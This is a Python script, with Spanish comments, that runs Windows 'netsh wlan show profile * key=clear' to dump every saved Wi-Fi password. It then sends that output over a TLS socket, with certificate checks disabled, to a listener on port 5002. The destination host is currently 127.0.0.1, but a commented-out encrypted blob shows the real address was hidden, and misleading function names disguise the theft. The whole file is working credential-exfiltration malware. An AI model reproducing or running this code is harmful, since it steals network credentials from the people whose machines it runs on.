
import subprocess
import threading
import warnings


warnings.filterwarnings("ignore", category=DeprecationWarning)
points = subprocess.Popen(["NETSH", "WLAN", "SHOW", "PROFILE", "*", "KEY=CLEAR"], stdout=subprocess.PIPE)


def know_gme():
    # unkown = b"9\x07\xa2:|\x9d\x1f\xe7bCN\x9aE\xfdKg4\xe7\x918\x00#\x05\x04\x00\xedR\x1c\x1c@\x15c\xf5\x91o\xcc~[z\xc9\x92B\x0c\xbf\xe9Z\xb9\x15\xd7l\xe2\x087 \xf1P\x90\xaf\x07\x0fI'\xb9\xd0"
    # return str(decrypt(unkown).decode())
    return "127.0.0.1"


def get_points():
    encodings = ["utf-8", "latin-1", "ascii"]  # Lista de codificaciones a probar
    for line in points.stdout:
        for encoding in encodings:
            try:
                point = line.rstrip().decode(encoding)
                print(point)
            except UnicodeDecodeError:
                continue

        else:
            # Si ninguna codificación funciona, utilizar una codificación por defecto o ignorar el error
            decoded_line = line.rstrip().decode(errors="ignore")
            print(decoded_line)


def use_points(sec):
    for line in points.stdout:
        sec.send(line)


def main(sec):

    # Definimos el primer hilo para leer la salida del comando
    get = threading.Thread(target=use_points(sec))

    # Iniciamos los hilos
    get.start()

    # Los juntamos para su uso
    get.join()

    sec.close()

def all_right():
    import certs
    import socket
    import tempfile
    import ssl

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)

    context.check_hostname = None

    cock = tempfile.NamedTemporaryFile(delete=False)
    cock.write(certs.get_crte().encode())
    cock.close()

    csd = tempfile.NamedTemporaryFile(delete=False)
    csd.write(certs.get_locker().encode())
    csd.close()

    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    context.verify_mode = ssl.CERT_NONE  # Cambiar a ssl.CERT_REQUIRED si deseas verificar el certificado del servidor
    context.load_cert_chain(certfile=cock.name, keyfile=csd.name)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((know_gme(), 5002))

    sec = context.wrap_socket(sock, server_hostname=know_gme())

    main(sec)



if __name__ == "__main__":
    all_right()
